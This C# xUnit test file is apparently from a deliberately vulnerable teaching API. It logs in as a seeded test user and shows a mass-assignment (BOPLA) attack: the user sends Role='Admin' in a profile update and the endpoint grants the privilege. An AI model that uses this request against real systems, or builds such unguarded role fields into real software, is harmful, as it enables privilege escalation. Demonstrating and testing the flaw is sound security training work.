using System.Net;
using System.Net.Http.Headers;
using System.Net.Http.Json;
using Microsoft.EntityFrameworkCore;
using Microsoft.Extensions.DependencyInjection;
using Murayama.VulnerableApi.Data;
using Murayama.VulnerableApi.DTOs.Auth;
using Murayama.VulnerableApi.Tests.Infrastructure;

namespace Murayama.VulnerableApi.Tests.Security;

public class BoplaTests
    : IClassFixture<CustomWebApplicationFactory>
{
    private readonly HttpClient _client;
    private readonly CustomWebApplicationFactory _factory;

    public BoplaTests(CustomWebApplicationFactory factory)
    {
        _factory = factory;
        _client = factory.CreateClient();
    }
    
    [Fact]
    public async Task Alice_Can_Modify_Her_Role_To_Admin_Demonstrating_Bopla()
    {
        // Arrange - authenticate as Alice
        var loginResponse = await _client.PostAsJsonAsync(
            "/api/Auth/login",
            new
            {
                Email = "alice@murayama.local",
                Password = "Alice123!"
            });

        Assert.Equal(HttpStatusCode.OK, loginResponse.StatusCode);

        var login = await loginResponse.Content
            .ReadFromJsonAsync<LoginResponse>();

        Assert.NotNull(login);
        Assert.False(string.IsNullOrWhiteSpace(login.AccessToken));

        _client.DefaultRequestHeaders.Authorization =
            new AuthenticationHeaderValue(
                "Bearer",
                login.AccessToken);

        // Act - Alice attempts to modify a sensitive property
        var response = await _client.PutAsJsonAsync(
            "/api/vulnerable/users/me",
            new
            {
                Id = 0,
                Name = "Alice",
                Email = "alice@murayama.local",
                PasswordHash = "",
                Role = "Admin"
            });

        // Assert - vulnerable endpoint accepts the privilege change
        Assert.Equal(HttpStatusCode.OK, response.StatusCode);

        using var scope = _factory.Services.CreateScope();

        var dbContext = scope.ServiceProvider
            .GetRequiredService<AppDbContext>();

        var alice = await dbContext.Users
            .SingleAsync(u => u.Email == "alice@murayama.local");

        try
        {
            Assert.Equal("Admin", alice.Role);
        }
        finally
        {
            alice.Role = "User";
            await dbContext.SaveChangesAsync();
        }
    }
}